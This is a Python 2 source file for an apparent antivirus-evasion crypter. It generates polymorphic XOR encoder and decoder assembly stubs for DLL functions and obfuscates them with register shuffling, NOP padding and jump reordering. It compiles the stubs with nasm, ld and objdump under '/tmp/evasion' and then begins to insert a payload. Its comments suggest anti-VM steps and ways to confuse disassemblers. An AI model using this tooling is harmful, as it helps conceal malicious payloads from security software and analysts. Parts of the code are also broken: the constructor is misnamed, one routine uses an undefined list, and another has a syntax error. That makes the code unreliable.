import shutil
import os
import GDBConsole

import random
import sys
import shutil
import os
import subprocess


class FuncEncode:
    '''
    This is the class containter for the function level inline encoder/decoder
    '''

    def init(self, afile = 'test.dll', percentage = 50, key = 44100, other = 'maybe', size = 2425393296):
        '''
        Initialization
        '''
        self.allstructures = []
        self.ordersaved = []
        self.passedfour = False
        if (self.debug == 1):
            print "Initializing..."
        self.afile = afile
        self.size = size
        self.percentage = percentage
        self.other = other
        self.key = key

    def set_registers(self):
        '''
        Register Selection
        '''
        if (self.debug == 1):
            print "Register setup..."
        registers = []
        registers.append("EAX")
        registers.append("ECX")
        registers.append("EBX")
        registers.append("EDX")
        random.shuffle(registers)
        self.registers = {'key': registers[0], 'size': registers[1], 'other': registers[2], 'scratch': registers[3]}
        self.registers_stages = [ 0, 0, 0, 0]
        if (self.debug == 1):
            print self.registers
            print self.registers['key']

    def compile_markers(self):
        '''
        Make the DLL with markers and space at function head and end
        '''
        if (self.debug == 1):
            print "DLL filler setup..."

    def setkey(self):
        '''
        '''

    def setendmark(self):
        '''
        '''

    def setoffset(self):
        '''
        '''

    def clearreg(self, srcreg):
        '''
        Routine for clearing a register
        '''
#        print "Clearing register: " + srcreg
        zero = []
        if (self.registers_stages[0]==2):
            zero.append(self.registers['key'])
        if (self.registers_stages[1]==2):
            zero.append(self.registers['size'])
        if (self.registers_stages[2]==2):
            zero.append(self.registers['other'])
        if (self.registers_stages[3]==2):
            zero.append(self.registers['scratch'])
        available = []
        if (self.registers_stages[0]==1):
            available.append(self.registers['key'])
        if (self.registers_stages[1]==1):
            available.append(self.registers['size'])
        if (self.registers_stages[2]==1):
            available.append(self.registers['other'])
        if (self.registers_stages[3]>0):
            available.append(self.registers['scratch'])
	#you need to add different ways to clear a register here
	#clearit = []
        #clearit.append("XOR " + srcreg + ", " + srcreg + ";")
	#also we can use registers we know to be zero...
        if ((len(zero))>0):
            for reg in zero:
                clearit.append("MOV " + srcreg + ", " + reg + ";")
        random.shuffle(clearit)
        thestruct = []
        thestruct.append(clearit[0])
        self.allstructures.append(thestruct)

    def savemix(self, srcreg):
        '''
        Routine for saving registers to the stack
        '''
#        print "Saving register: " + srcreg
        self.ordersaved.append(srcreg)
        available = []
        if (self.registers_stages[0]==1):
            available.append(self.registers['key'])
        if (self.registers_stages[1]==1):
            available.append(self.registers['size'])
        if (self.registers_stages[2]==1):
            available.append(self.registers['other'])
        if (self.registers_stages[3]>0):
            available.append(self.registers['scratch'])
#        print "Registers availabe for use: " + str(available)
        savestructure = []
        setlen = len(available)
        alen = 0
        if ((setlen)<1):
            thisinst = "PUSH " + srcreg + ";"
            savestructure.append(thisinst)
        else:
            random.shuffle(available)
            alen = random.randrange(0, setlen, 1)
            thisinst = "MOV " + available[0] + ", " + srcreg + ";"
            savestructure.append(thisinst)
            index = -1
            while(index <= alen):
                index = index + 1
                if ((index + 1)<len(available)):
                    thisinst = "MOV " + available[index+1] + ", " + available[index] + ";"
                    savestructure.append(thisinst)
            blen = random.randrange(0, alen+1, 1)
            thisinst = "PUSH " + available[blen] + ";"
            savestructure.append(thisinst)
        self.allstructures.append(savestructure)

    def restoremix(self, srcreg):
        '''
        Routine for saving registers to the stack
        '''
#        print "Restoring register: " + srcreg
        available = []
        if (self.registers_stages[0]==5):
            available.append(self.registers['key'])
        if (self.registers_stages[1]==5):
            available.append(self.registers['size'])
        if (self.registers_stages[2]==5):
            available.append(self.registers['other'])
        if (self.registers_stages[3]==5):
            available.append(self.registers['scratch'])
#        print "Registers availabe for use: " + str(available)
        savestructure = []
        setlen = len(available)
        alen = 0
        if ((setlen)<1):
            thisinst = "POP " + srcreg + ";"
            savestructure.append(thisinst)
        else:
            random.shuffle(available)
            alen = random.randrange(0, setlen, 1)
            thisinst = "POP " + available[0] + ", " + srcreg + ";"
            savestructure.append(thisinst)
#            print savestructure
            index = -1
            while(index <= alen):
                index = index + 1
                if ((index + 1)<len(available)):
                    thisinst = "MOV " + available[index+1] + ", " + available[index] + ";"
                    savestructure.append(thisinst)
            blen = random.randrange(0, alen+1, 1)
            thisinst = "MOV " + srcreg + ", " + available[blen] + ";"
            savestructure.append(thisinst)
        self.allstructures.append(savestructure)

    def factor(self, n):
        if n == 1:
            return [1]  
        i = 2
        ret = []
        limit = n * 0.5
        while i <= limit:  
            if n % i == 0:
                aret = self.factor(n/i)
                for items in aret:
                    ret.append(items)
                ret.append(i)  
                return ret
            i += 1
        return[n]

    def short_factor(self, factors):
        while (len(factors)>4):
            random.shuffle(factors)
            a = factors.pop()
            b = factors.pop()
            c = a * b
            factors.append(c)
        return factors


    def size_stage_three(self):
        '''
        Here is where we set the key
        The example is with multiplication,
        but there could be logic for any mathematical operation
        '''
        structure = []
        factors = self.factor(self.size)
        afactor = factors.pop()
        struct = "MOV " + self.registers['size'] + ", " + str(afactor) + ";"
        structure.append(struct)
        factors = self.short_factor(factors)
        for afactor in factors:
            struct = "IMUL " + self.registers['size'] + ", " + str(afactor) + ";"
            structure.append(struct)
        self.allstructures.append(structure)


    def key_stage(self):
        '''
        This is where we set the key/seed for our XOR.  This makes the encoding a little more random.  A small
        routine to make the key random and NULL-less would be a nice touch...but this is for staged dlls, not
        shellcode at the moment.
        '''
        if (self.registers_stages[0]==0):
            print "Key stage 1"
            self.savemix(self.registers['key'])
        if (self.registers_stages[0]==1):
            self.clearreg(self.registers['key'])
        if (self.registers_stages[0]==2):
            print "Key stage 3"
            self.key_stage_three()
        if (self.registers_stages[0]==3):
            print "Key stage 4"
        if (self.registers_stages[0]==4):
            print "Key stage 5"
        if (self.registers_stages[0]==5):
            print "Key stage 6"

    def size_stage(self):
        '''
        This is where we set the size of the function in bytes.
        '''
        if (self.registers_stages[1]==0):
            print "Size stage 1"
            self.savemix(self.registers['size'])
        if (self.registers_stages[1]==1):
            self.clearreg(self.registers['size'])
        if (self.registers_stages[1]==2):
            print "Size stage 3"
            self.size_stage_three()
        if (self.registers_stages[1]==3):
            print "Size stage 4"
        if (self.registers_stages[1]==4):
            print "Size stage 5"
        if (self.registers_stages[1]==5):
            print "Size stage 6"

    def other_stage(self):
        '''
        This could be used for anything in the decoder, but is used for the start or end of code offset in the re-encoder.
        If the code to be encoded is too long, this could be used for a loop counter.  Another approach would be to put
        a short jump over a herring value to find the start and end of the function.  Specific herrings may confuse
        disassemblers.  Another thing to note is that in the case of dual stage encoding, we may want to specify
        an offset here for some reason.
        '''
        if (self.registers_stages[2]==0):
            print "Other stage 1"
            self.savemix(self.registers['other'])
        if (self.registers_stages[2]==1):
            self.clearreg(self.registers['other'])
        if (self.registers_stages[2]==2):
            print "Other stage 3"
        if (self.registers_stages[2]==3):
            print "Other stage 4"
        if (self.registers_stages[2]==4):
            print "Other stage 5"
        if (self.registers_stages[2]==5):
            print "Other stage 6"

    def scratch_stage(self):
        '''
        Just manipulate the scratch register in some ways similar to other stuff.  Obfuscate the assembly.
        '''
        if (self.registers_stages[3]==0):
            print "Scratch stage 1"
            self.savemix(self.registers['scratch'])
        if (self.registers_stages[3]==1):
            self.clearreg(self.registers['scratch'])
        if (self.registers_stages[3]==2):
            print "Scratch stage 3"
        if (self.registers_stages[3]==3):
            print "Scratch stage 4"
        if (self.registers_stages[3]==4):
            print "Scratch stage 5"
        if (self.registers_stages[3]==5):
            print "Scratch stage 6"

    def xorloop(self):
        '''
        A simple xor-ing loop that checks for 4 nops back to back
        So we don't have to worry about alignment we could just put in eight
        as a marker.
        '''
        encoder = []
        encoder.append("NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP;")
        self.allenc = []
        #0
        holder = []
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #1
        holder.append('0')
        holder[len(holder)-1] = "PUSH " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "CMP " + self.registers['size'] + ", [" + self.registers['other'] + "-4];"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #2
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "SUB " + self.registers['other'] + ", 1;"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #3
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "SUB " + self.registers['other'] + ", 1;"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #4
        holder.append('0')
        holder[len(holder)-1] = "PUSH " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "CMP " + self.registers['size'] + ", [" + self.registers['other'] + "-4];"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #5
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "SUB " + self.registers['other'] + ", 1;"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #6
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #7
        holder.append('0')
        holder[len(holder)-1] = "XOR [" + self.registers['other'] + "], " + self.registers['key'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #8
        holder.append('0')
        holder[len(holder)-1] = "ADD " + self.registers['other'] + ", 1;"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #9
        holder.append('0')
        holder[len(holder)-1] = "PUSH " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "CMP " + self.registers['size'] + ", [" + self.registers['other'] + " + 3];"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #10
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #11
        holder.append('0')
        holder[len(holder)-1] = "POP " + self.registers['size'] + ";"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"
        #12
        holder.append('0')
        holder[len(holder)-1] = "MOV " + self.registers['other'] + ", [ESP];"
        holder.append('0')
        holder[len(holder)-1] = "RET;"
        holder.append('0')
        holder[len(holder)-1] = "NOP;"

        self.allenc = holder[:]
        decoder = []
        decoder.append("NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP;")
        #0
        self.alldec = []
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #1
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "PUSH " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "CMP " + self.registers['size'] + ", [" + self.registers['other'] + "];"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #2
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "POP " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "ADD " + self.registers['other'] + " , 1;"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #3
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "POP " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "ADD " + self.registers['other'] + " , 4;"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #4
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "XOR [" + self.registers['other'] + "], " + self.registers['key'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #5
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "ADD " + self.registers['other'] + " , 1;"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #6
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "PUSH " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "CMP " + self.registers['size'] + ", [" + self.registers['other'] + "+3];"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #7
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "POP " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #8
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "POP " + self.registers['size'] + ";"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"
        #9
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "MOV " + self.registers['other'] + ", [ESP];"
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "ret;"

        holder = self.alldec[:]
        self.alldec = holder[:]
        self.alldec.append(0)
        self.alldec[len(self.alldec)-1] = "NOP;"

        self.allstructures.append(decoder)
#        print self.allstructures
#        print self.allstructuresenc

    def stages_all_five(self, chainindex):
        if (self.registers_stages.count(3)==4):
            stagesum = True
            self.passedfour = True
            self.registers_stages = [4,4,4,4]
            self.registers_stages[chainindex] = 5
        else:
            if (self.passedfour == True):
                stagesum = True
            else:
                stagesum = False
        return stagesum

    def chain_select(self, chainindex):
        '''
        This is where we select a chunk of assembly for the appropriate register and stage
        note: I know that dictionary keys are stored in no particular order...
        Number of stages can be easily modified with the iterations variable in the calling routine
        This allows adding of extra steps if desired...like a shuffle registers step or
        a bogus loop step just to make analysis a little more confusing.  Anti-VM could be a step too...
        '''
        print self.registers_stages
        if ((self.registers_stages[chainindex] == 3) and (self.stages_all_five(chainindex) != True)):
            self.registers_stages[chainindex] = self.registers_stages[chainindex] - 1
        elif (self.registers_stages[chainindex] == 4):
            print "Calling loop routine"
            #Insert call to loop...they should all be synced now
            #Random restore is all that is left after this
            self.xorloop()
            self.registers_stages = [5,5,5,5]
            self.registers_stages[chainindex] = 4
        else:
            if (chainindex == 0):
                self.key_stage()
            elif (chainindex == 1):
                self.size_stage()
            elif (chainindex == 2):
                self.other_stage()
            elif (chainindex == 3):
                self.scratch_stage()

    def build_chains(self):
        '''
        Build Encode and Decode Chains
        '''
        if (self.debug == 1):
            print "Building chains..."
        iterations = 7
        chainselect = 3
        self.chain_select(3)
        self.registers_stages[chainselect] = 1
        while((self.registers_stages[0]<iterations) or (self.registers_stages[1]<iterations) or (self.registers_stages[2]<iterations) or (self.registers_stages[3]<iterations)):
            chainselect = random.randrange(0, 4, 1)
            if (self.registers_stages[chainselect] != iterations):
                self.chain_select(chainselect)
                self.registers_stages[chainselect] = (self.registers_stages[chainselect]) + 1
            else:
                chainselect = chainselect + 1
                if (chainselect > 3):
                    chainselect = 0
                if (self.registers_stages[chainselect] != iterations):
                    self.chain_select(chainselect)
                    self.registers_stages[chainselect] = (self.registers_stages[chainselect]) + 1
                else:
                    chainselect = chainselect + 1
                    if (chainselect > 3):
                        chainselect = 0
                    if (self.registers_stages[chainselect] != iterations):
                        self.chain_select(chainselect)
                        self.registers_stages[chainselect] = (self.registers_stages[chainselect]) + 1
                    else:
                        chainselect = chainselect + 1
                        if (chainselect > 3):
                            chainselect = 0
                        if (self.registers_stages[chainselect] != iterations):
                            self.chain_select(chainselect)
                            self.registers_stages[chainselect] = (self.registers_stages[chainselect]) + 1
                        else:
                            print "We should NEVER GET HERE something went HORRIBLY WRONG"
                            sys.exit(1)
            if (self.debug == 1):
                print self.registers_stages

    def areg(self):
        '''
        For when we need a register and we don't really care which one...
        '''
        areg=['EAX', 'ECX', 'EBX', 'EDX']
        random.shuffle(areg)
        return areg[0]

    def nop_insert(self):
        '''
        NOP-like insertion routine
        '''
        if (self.debug == 1):
        
#            print "Inserting NOPs..."
        noplist = ['NOP;']
        areg = self.areg()
        areg = self.areg()
        breg = areg
        while (areg == breg):
            breg = self.areg()
	#You need to build a list of NOP-like structures here
        #anop = "MOV " + areg + ", " +areg + ";"
        #noplist.append(anop)
        i = 0
        tempstruct = []
        for structure in self.allstructures:
            setlen = len(structure)
            alen = random.randrange(0, setlen, 1)
            random.shuffle(noplist)
            if (structure[0] != 'NOP; NOP; NOP; NOP; NOP; NOP; NOP; NOP;'):
                tempstruct.append(structure)
                structure.insert(alen, noplist[0])
            else:
                tempstruct.append(structure)
            i = i + 1
        self.allstructures = tempstruct[:]

    def jmp_mix(self):
        '''
        The jmp mixing routine.  Chains are already fairly random, but we can add jmp mixing here.
        '''
        if (self.debug == 1):
            print "Jump mixing..."
        i = 0
#could have added recursion here, but i was lazy
        for structure in self.attallstructuresenc:
            if (structure[0] == 'replaceme'):
                pass
                self.attallstructuresenc.pop(i)
                for structure in self.attenc:
                    self.attallstructuresenc.insert(i, structure)
            i = i + 1
        i = 0
        for structure in self.attallstructures:
            if (structure[0] == 'replaceme'):
                pass
                self.attallstructures.pop(i)
                for structure in self.attdec:
                    self.attallstructures.insert(i, structure)
            i = i + 1

        self.attallstructuresenc[-1].append('jmp label_enc_end;')
        self.attallstructures[-1].append('jmp label_dec_end;')
        self.attallstructures[-1]
        random.shuffle(self.attallstructuresenc)
        random.shuffle(self.attallstructures)
        initjump = 'jmp label_dec_10;'
        temp = []
        temp.append(initjump)
        initjumpa = 'jmp label_enc_10;'
        tempa = []
        tempa.append(initjumpa)
        tempb = []
        tempc = []
        endlbl = 'label_enc_end:;'
        endlbla = 'label_dec_end:;'
        nop = 'NOP;'
        tempb.append(endlbl)
        tempa.append(nop)
        tempa.append(nop)
        tempc.append(endlbla)
        self.attallstructuresenc.insert(0, tempa)
        self.attallstructures.insert(0, temp)
        self.attallstructuresenc.append(tempb)
        self.attallstructures.append(tempc)


    def replace_decoder(self):
        '''
        Replaces the decoder filler
        '''

        if (self.debug == 1):
            print "Replacing decoder filler..."
        try:
            shutil.move("/tmp/evasion/tempfileout", "/tmp/evasion/tempfileouta")
        except:
            pass
        f = open('/tmp/evasion/tempfileouta', 'r+')
        lines = f.readlines()
        i = 0
        j = 0
        for line in lines:
            line = line.rstrip()
            if (line == "replacemestart"):
                j = i
            i = i + 1
        try:
            os.remove("/tmp/evasion/test.c")
        except:
            pass
        g = open('/tmp/evasion/test.c', 'w')
        f.close()
        f = open('/tmp/evasion/tempfileouta', 'r+')
        lines = f.readlines()
        i = 0
        for line in lines:
            if (i != j):
                g.write(line)
            else:
                l = 0
                for structure in self.attallstructures:
                    for instruction in structure:
                        if (instruction != "replaceme"):
                            g.write('"')
                            g.write(instruction)
                            g.write('"')
                            g.write("\n")
                        else:
                            k = 0
                            for astructure in self.attdec:
                                astructure.insert(0, "label_indec_" + str(k) + ":;")
                                if ((k+2) == len(self.attdec)):
                                    astructure.append("jmp label_dec_" + str(11+l) + ";")
                                elif (k == 0):
                                    astructure.append("call label_indec_9;")
                                    astructure.append("jmp label_indec_1;")
                                elif (k == 1):
                                    astructure.append("jnz label_indec_2;")
                                    astructure.append("jmp label_indec_3;")
                                elif (k == 2):
                                    astructure.append("jmp label_indec_1;")
                                elif (k == 3):
                                    astructure.append("jmp label_indec_4;")
                                elif (k == 4):
                                    astructure.append("jmp label_indec_5;")
                                elif (k == 5):
                                    astructure.append("jmp label_indec_6;")
                                elif (k == 6):
                                    astructure.append("jnz label_indec_7;")
                                    astructure.append("jmp label_indec_8;")
                                elif (k == 7):
                                    astructure.append("jmp label_indec_4;")
#                                else:
#                                    astructure.append("jmp label_indec_" + str(k + 1) + ";")
                                for ainstruction in astructure:
                                    g.write('"')
                                    g.write(ainstruction)
                                    g.write('"')
                                    g.write("\n")
                                k = k + 1
                    l = l + 1
                m = 0
                g.write('"jmp label_skipnopa;"')
                g.write("\n")
                while (m < 4):
                    g.write('"nop;"')
                    g.write("\n")
                    m = m + 1
                g.write('"label_skipnopa:;"')
                g.write("\n")
            i = i + 1

        f.close()
        g.close()

    def replace_encoder(self):
        '''
        Replaces the encdoer filler
        '''
        if (self.debug == 1):
            print "Replacing encoder filler..."
        f = open('/tmp/evasion/test.c', 'r+')
        lines = f.readlines()
        i = 0
        j = 0
        for line in lines:
            line = line.rstrip()
            if (line == "replacemeend"):
                j = i
            i = i + 1
        try:
            os.remove("/tmp/evasion/tempfileout")
        except:
            pass
        g = open('/tmp/evasion/tempfileout', 'w')
        f.close()
        f = open('/tmp/evasion/test.c', 'r+')
        lines = f.readlines()
        i = 0
        for line in lines:
            if (i != j):
                g.write(line)
            else:
                l = 0
                m = 0
                g.write('"jmp label_skipnopb;"')
                g.write("\n")
                while (m < 4):
                    g.write('"nop;"')
                    g.write("\n")
                    m = m + 1
                g.write('"label_skipnopb:;"')
                g.write("\n")

                for structure in self.attallstructuresenc:
                    for instruction in structure:
                        if (instruction != "replaceme"):
                            g.write('"')
                            g.write(instruction)
                            g.write('"')
                            g.write("\n")
                        else:
                            k = 0
                            for astructure in self.attenc:
                                astructure.insert(0, "label_inenc_" + str(k) + ":;")
                                if ((k+2) == len(self.attenc)):
                                    astructure.append("jmp label_enc_" + str(11+l) + ";")
                                elif (k == 0):
                                    astructure.append("call label_inenc_12;")
                                    astructure.append("jmp label_inenc_1;")
                                elif (k == 1):
                                    astructure.append("jnz label_inenc_2;")
                                    astructure.append("jmp label_inenc_3;")
                                elif (k == 2):
                                    astructure.append("jmp label_inenc_1;")
                                elif (k == 3):
                                    astructure.append("jmp label_inenc_4;")
                                elif (k == 4):
                                    astructure.append("jnz label_inenc_5;")
                                    astructure.append("jmp label_inenc_6;")
                                elif (k == 5):
                                    astructure.append("jmp label_inenc_4;")
                                elif (k == 6):
                                    astructure.append("jmp label_inenc_7;")
                                elif (k == 7):
                                    astructure.append("jmp label_inenc_8;")
                                elif (k == 8):
                                    astructure.append("jmp label_inenc_9;")
                                elif (k == 9):
                                    astructure.append("jnz label_inenc_10;")
                                    astructure.append("jmp label_inenc_11;")
                                elif (k == 10):
                                    astructure.append("jmp label_inenc_7;")
                                for ainstruction in astructure:
                                    g.write('"')
                                    g.write(ainstruction)
                                    g.write('"')
                                    g.write("\n")
                                k = k + 1
                    l = l + 1
            i = i + 1
        f.close()
        g.close()

    def replace_line_att(self, astruct):
        '''
        Yeah
        '''
        f = open('/tmp/evasion/scaffoldatt.s', 'r+')
        lines = f.readlines()
        i = 0
        j = 0
        for line in lines:
            line = line.rstrip()
            if "replaceme" in line:
                j = i
            i = i + 1
        try:
            os.remove("/tmp/evasion/tempfileout.s")
        except:
            pass
        g = open('/tmp/evasion/tempfileout.s', 'w')
        f.close()
        f = open('/tmp/evasion/scaffoldatt.s', 'r+')
        lines = f.readlines()
        i = 0
        for line in lines:
            if (i != j):
                g.write(line)
            else:
                 for instruction in astruct:
                     g.write(instruction)
                     g.write("\n")
            i = i + 1
        f.close()
        g.close()

    def assemble_the_intel(self):
        '''
        Yeah
        '''
        allstruct = []
        p = subprocess.Popen('nasm -f elf -o /tmp/evasion/asm.o /tmp/evasion/tempfileout.s', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in p.stdout.readlines():
            line = line.rstrip()
        retval = p.wait()
        p = subprocess.Popen('ld /tmp/evasion/asm.o -o /tmp/evasion/asm', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in p.stdout.readlines():
            line = line.rstrip()
        retval = p.wait()
        p = subprocess.Popen('objdump -d /tmp/evasion/asm', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        for line in p.stdout.readlines():
            line = line.rstrip()
            allstruct.append(line)
        retval = p.wait()
        retval = retval
        allstruct = allstruct[7:(len(allstruct)-3)]
        return allstruct

    def fixup_for_jumps(self):
        '''
        sadly...necessary
        '''
        print "Adding labels and jumps..."
        i = 0
        for struct in self.attallstructures:
            if ((struct[0] == "nop;") and ((len(struct)) == 1)):
                self.attallstructures[i-1].pop()
                self.attallstructures[i-1].append("jmp label_indec_0;")
                struct.pop()
                struct.append("replaceme")
            else:
                struct.insert(0, "label_dec_" + str(10 + i) + ":;")
                struct.append("jmp label_dec_" + str(11 + i) + ";")
            i = i + 1
        i = 0
        self.attallstructures[-1].pop()

        i = 0
        for struct in self.attallstructuresenc:
            if ((struct[0] == "nop;") and ((len(struct)) == 1)):
                self.attallstructuresenc[i-1].pop()
                self.attallstructuresenc[i-1].append("jmp label_inenc_0;")
                struct.pop()
                struct.append("replaceme")
            else:
                struct.insert(0, "label_enc_" + str(10 + i) + ":;")
                struct.append("jmp label_enc_" + str(11 + i) + ";")
            i = i + 1
        i = 0
        self.attallstructuresenc[-1].pop()

    def fix_for_att(self):
        '''
        I really don't like writing in at&t
        '''
        print "Converting Intel to AT&T"
        self.attallstructures = []
        self.attallstructuresenc = []
        for astruct in self.allstructures:
            self.replace_line_att(astruct)
            self.attallstructures.append(self.assemble_the_intel())
        attstructs = []
        for structs in self.attallstructures:
            attstruct = []
            for struct in structs:
                chunks = struct.split('\t')
                astruct = chunks[-1]
                astruct = astruct + ";"
                attstruct.append(astruct)
            attstructs.append(attstruct)
        self.attallstructures = attstructs
        self.allstructuresenc = self.allstructures[:]

        for astruct in self.allstructuresenc:
            self.replace_line_att(astruct)
            self.attallstructuresenc.append(self.assemble_the_intel())
        attstructs = []
        for structs in self.attallstructuresenc:
            attstruct = []
            for struct in structs:
                chunks = struct.split('\t')
                astruct = chunks[-1]
                astruct = astruct + ";"
                attstruct.append(astruct)
            attstructs.append(attstruct)
        self.attallstructuresenc = attstructs

        self.attenc = []
        self.replace_line_att(self.allenc)
        self.attenc.append(self.assemble_the_intel())
        attstructs = []
        for structs in self.attenc:
            attstruct = []
            for struct in structs:
                chunks = struct.split('\t')
                astruct = chunks[-1]
                astruct = astruct + ";"
                attstruct.append(astruct)
            attstructs.append(attstruct)
        self.attenc = attstructs

        self.attdec = []
        self.replace_line_att(self.alldec)
        self.attdec.append(self.assemble_the_intel())
        attstructs = []
        for structs in self.attdec:
            attstruct = []
            for struct in structs:
                chunks = struct.split('\t')
                astruct = chunks[-1]
                astruct = astruct + ";"
                attstruct.append(astruct)
            attstructs.append(attstruct)
        self.attdec = attstructs


        newattdec = []
        astruct = []
        for line in self.attdec[0]:
            if (line != "nop;"):
                astruct.append(line)
            else:
                bstruct = astruct[:]
                newattdec.append(bstruct)
                astruct = []
        self.attdec = newattdec

        newattenc = []
        astruct = []
        for line in self.attenc[0]:
            if (line != "nop;"):
                astruct.append(line)
            else:
                bstruct = astruct[:]
                newattenc.append(bstruct)
                astruct = []
        self.attenc = newattenc


        self.fixup_for_jumps()

    def set_debug(self, debug = 1):
        self.debug = debug

    def restoreregs(self, regorder):
        '''
        Restore registers
        '''
        for register in regorder:
            pop = "POP " + register + ";"
            popa = []
            popa.append(pop)
            self.allstructures.append(popa)

    def use_mixed(self):
        '''
        '''
        print "Generating mixed..."
        f = open('/tmp/evasion/testa.c', 'r+')
        lines = f.readlines()
        i = 0
        j = 0
        for line in lines:
            line = line.rstrip()
            if (line == "replacemeend"):
                j = i
            i = i + 1
        try:
            os.remove("/tmp/evasion/tempfileout")
        except:
            pass
        g = open('/tmp/evasion/tempfileout', 'w')
        f.close()
        f = open('/tmp/evasion/testa.c', 'r+')
        lines = f.readlines()
        i = 0
        for line in lines:
            if (i != j):
                g.write(line)
            else:
                m = 0
                g.write('"jmp label_skipnopa;"')
                g.write("\n")
                while (m < 4):
                    g.write('"nop;"')
                    g.write("\n")
                    m = m + 1
                g.write('"label_skipnopa:;"')
                g.write("\n")
                for structure in self.attallstructuresenc:
                    for instruction in structure:
                        g.write('"')
                        g.write(instruction)
                        g.write('"')
                        g.write("\n")
            i = i + 1
        try:
            shutil.move("/tmp/evasion/tempfileout", "/tmp/evasion/tempfileouta")
        except:
            pass
        f = open('/tmp/evasion/tempfileouta', 'r+')
        lines = f.readlines()
        i = 0
        j = 0
        for line in lines:
            line = line.rstrip()
            if (line == "replacemestart"):
                j = i
            i = i + 1
        try:
            os.remove("/tmp/evasion/testa.c")
        except:
            pass
        g = open('/tmp/evasion/testa.c', 'w')
        f.close()
        f = open('/tmp/evasion/tempfileouta', 'r+')
        lines = f.readlines()
        i = 0
        for line in lines:
            if (i != j):
                g.write(line)
            else:
                for structure in self.attallstructures:
                    for instruction in structure:
                        g.write('"')
                        g.write(instruction)
                        g.write('"')
                        g.write("\n")
                m = 0
                g.write('"jmp label_skipnopb;"')
                g.write("\n")
                while (m < 4):
                    g.write('"nop;"')
                    g.write("\n")
                    m = m + 1
                g.write('"label_skipnopb:;"')
                g.write("\n")
            i = i + 1


    def dropfiles(self):
        '''
        Drop the required files
        '''
        try:
            shutil.rmtree("/tmp/evasion")
        except:
            pass
        os.mkdir("/tmp/evasion")
#you probably want to change to use [HOME] from env, but i was just powering through it
        shutil.copyfile("/home/username/work/evasion/tools/asm/scaffoldatt.s", "/tmp/evasion/scaffoldatt.s")
        shutil.copyfile("/tmp/evasion/scaffoldatt.s", "/tmp/evasion/scaffoldattempty.s")
        shutil.copyfile("/home/username/work/evasion/tools/c/loader.c", "/tmp/evasion/loader.c")
        shutil.copyfile("/home/username/work/evasion/tools/c/test.c", "/tmp/evasion/test.c")
        shutil.copyfile("/home/username/work/evasion/tools/c/test.h", "/tmp/evasion/test.h")
        shutil.copyfile("/home/username/work/evasion/tools/c/loadera.c", "/tmp/evasion/loadera.c")
        shutil.copyfile("/home/username/work/evasion/tools/c/testa.c", "/tmp/evasion/testa.c")
        shutil.copyfile("/home/username/work/evasion/tools/c/testa.h", "/tmp/evasion/testa.h")
        shutil.copyfile("/home/username/work/evasion/tools/c/Makefile", "/tmp/evasion/Makefile")
        shutil.copyfile("/home/username/work/evasion/tools/tryit", "/tmp/evasion/tryit")

    def insertpayload(self):
        '''
        '''
        print "Inserting payload..."
        start = 'no'
        payload = ''
        payloadstrip = ''
        with open('/home/username/test.c', 'r') as payloadfile:
            payloadlist = payloadfile.readlines()
            for line in payloadlist:
                if (start != 'done'):
                    try:
                        line.index('bytes')
                        temp = line.split('bytes')
                        tempa = temp[0].split('-')
                        tempc = ''
                        for char in tempa[1]:
                            if (char != ' '):
                                tempc += char
                        paysize = int(tempc)
